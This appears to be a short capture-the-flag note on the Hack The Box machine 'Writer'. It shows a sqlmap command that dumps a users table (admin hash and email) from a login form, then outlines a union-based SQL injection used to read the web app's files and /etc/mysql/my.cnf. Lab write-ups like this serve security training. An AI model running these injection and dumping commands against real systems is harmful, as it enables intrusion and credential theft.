# Administrative SQLMap


```bash
sqlmap -u "http://writer.htb/administrative" --forms -D writer -T users -C id,username,password,email --dump -batch

+----+----------+----------------------------------+------------------+
| id | username | password                         | email            |
+----+----------+----------------------------------+------------------+
| 1  | admin    | 118e48794631a9612484ca8b55f622d0 | admin@writer.htb |
+----+----------+----------------------------------+------------------+

```

* Password is not crackable, but uname is injectable. Let's try read files using union attack

![[Pasted image 20210801175900.png]]

* Finding the webapp directory

#### /var/www/writer.htb
#### /var/www/writer.htb/writer.wsgi
#### /var/www/writer.htb/writer/static/

![[Pasted image 20210801180733.png]]




#### /etc/mysql/my.cnf

![[Pasted image 20210801204710.png]]